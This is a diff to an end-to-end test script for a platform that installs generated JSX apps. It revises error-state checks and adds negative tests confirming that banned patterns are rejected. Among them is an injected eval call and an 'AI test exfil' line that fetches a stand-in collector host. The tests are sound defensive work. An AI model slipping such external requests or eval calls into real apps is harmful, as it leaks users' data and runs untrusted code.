@@ -909,18 +909,25 @@ async function main() {
 
     // ── Error state ───────────────────────────────────────────────────────
     if (want('E')) {
-      scenario('E', 'Error state — one query points at a resource that does not exist');
-      const { cr } = await previewAndCreate({ name: 'AI test error handling', key: 'ai-test-errorstate', kind: 'app', datastore_namespace: false, files: { 'app.jsx': read('errorstate.app.jsx') } });
+      scenario('E', 'Error state — a resource the server lacks is refused at install; a query that fails at runtime shows a NoticeBox');
+      // Since 2.8.42 the preview probes every resource the code calls: a path the
+      // server does not have is refused before install (it used to install and fail).
+      const refused = await previewAndCreate({ name: 'AI test error handling', key: 'ai-test-errorstate', kind: 'app', datastore_namespace: false, files: { 'app.jsx': read('errorstate.app.jsx') } });
+      check('an app calling a resource this server does not have is refused before install', !refused.cr.r.success && /does not have: aiTestResourceThatDoesNotExist/.test(refused.cr.r._error || ''), refused.cr.r._error);
+      // A real resource asked a bad question fails only at runtime (400): the
+      // generated pattern must show a NoticeBox there, never a blank page.
+      const runtimeFailing = read('errorstate.app.jsx').replace("{ x: { resource: 'aiTestResourceThatDoesNotExist' } }", "{ x: { resource: 'programs', params: { fields: 'id', filter: 'aiTestNoSuchProperty:eq:x' } } }");
+      const { cr } = await previewAndCreate({ name: 'AI test error handling', key: 'ai-test-errorstate', kind: 'app', datastore_namespace: false, files: { 'app.jsx': runtimeFailing } });
       check('create: installed', cr.r.success === true, cr.r._error);
       const context = await newContext(browser, DESKTOP);
       const page = await context.newPage();
-      const log = collect(page, 'ai-test-errorstate', ['aiTestResourceThatDoesNotExist']);
+      const log = collect(page, 'ai-test-errorstate', ['aiTestNoSuchProperty']);
       await page.goto(`${BASE}/api/apps/ai-test-errorstate/index.html?redirect=false`);
       await settled(page.mainFrame());
       const m = await metrics(page.mainFrame());
       check('the failing query renders an error NoticeBox (not a blank page)', m.notices.length === 1 && m.notices[0].error, JSON.stringify(m.notices));
       check('the healthy section still renders its data', /\d+ programs/.test(await page.mainFrame().evaluate(() => document.body.innerText)));
-      check('the only failed request is the deliberate 404', log.failed.length === 0 && log.expected.some((x) => /404/.test(x)), log.expected.join(' | '));
+      check('the only failed request is the deliberate 400', log.failed.length === 0 && log.expected.some((x) => /^400/.test(x)), log.expected.join(' | '));
       check('no uncaught exceptions', m.errs.length === 0, m.errs.join('; '));
       assertLayout(m, 'error state');
       await shot(page, 'error state', { group: 'error' });
@@ -978,7 +985,10 @@ async function main() {
         note(`${name}: ${r._error}${r._hint ? ` — hint: ${r._hint}` : ''}`);
         return r;
       };
-      const good = read('errorstate.app.jsx');
+      // An app that installs as is (the error-state app with its made-up resource
+      // swapped for a real one: since 2.8.42 a resource the server lacks is refused
+      // before the checks below are reached).
+      const good = read('errorstate.app.jsx').replace("{ x: { resource: 'aiTestResourceThatDoesNotExist' } }", "{ x: { resource: 'programs', params: { fields: 'id', filter: 'aiTestNoSuchProperty:eq:x' } } }");
       await neg('JSX syntax error', { action: 'create', name: 'AI test broken', key: 'ai-test-broken', kind: 'app', files: { 'app.jsx': good.replace('<h1 style', '<h1 broken style').replace('</h1>', '</h2>') } }, (r) => r.compile_errors && r.compile_errors[0].line > 0);
       await neg('banned pattern: eval', { action: 'create', name: 'AI test eval', key: 'ai-test-eval', kind: 'app', files: { 'app.jsx': good.replace('function App() {', 'function App() {\n  eval("1+1");') } }, (r) => (r.violations || []).some((v) => v.rule === 'eval'));
       await neg('banned pattern: external fetch', { action: 'create', name: 'AI test exfil', key: 'ai-test-exfil', kind: 'app', files: { 'app.jsx': good.replace('function App() {', 'function App() {\n  fetch("https://collector.example.com/x");') } }, (r) => (r.violations || []).some((v) => v.rule === 'external-request'));
